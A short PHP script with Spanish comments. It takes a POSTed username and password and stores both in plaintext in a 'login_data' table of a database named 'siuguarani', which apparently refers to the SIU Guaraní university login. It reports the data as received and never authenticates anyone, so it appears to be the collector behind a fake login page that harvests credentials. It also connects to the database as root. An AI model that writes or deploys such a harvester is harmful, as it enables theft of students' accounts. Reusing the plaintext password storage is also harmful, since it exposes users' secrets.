<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $contraseña = $_POST['contraseña'];

    // Conexión a la base de datos
    $conn = new mysqli("localhost", "root", "tu_contraseña", "siuguarani");

    // Verificar la conexión
    if ($conn->connect_error) {
        die("Conexión fallida: " . $conn->connect_error);
    }

    // Insertar los datos en la tabla login_data
    $stmt = $conn->prepare("INSERT INTO login_data (usuario, contraseña) VALUES (?, ?)");
    $stmt->bind_param("ss", $usuario, $contraseña);

    if ($stmt->execute()) {
        echo "<h2>Datos recibidos correctamente.</h2>";
        echo "<p>Usuario: " . htmlspecialchars($usuario) . "</p>";
    } else {
        echo "Error: " . $stmt->error;
    }

    // Cerrar la conexión
    $stmt->close();
    $conn->close();

    echo "<p><a href='index.html'>Volver al inicio</a></p>";
}
?>